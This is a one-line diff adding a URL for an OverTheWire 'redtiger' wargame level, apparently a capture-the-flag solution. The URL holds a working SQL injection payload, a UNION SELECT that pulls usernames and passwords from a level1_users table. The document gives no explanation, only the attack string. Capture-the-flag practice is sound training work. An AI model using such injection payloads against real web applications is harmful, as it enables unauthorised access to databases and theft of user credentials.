@@ -1,0 +1,1 @@
+http://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1, 2, username, password from level1_users
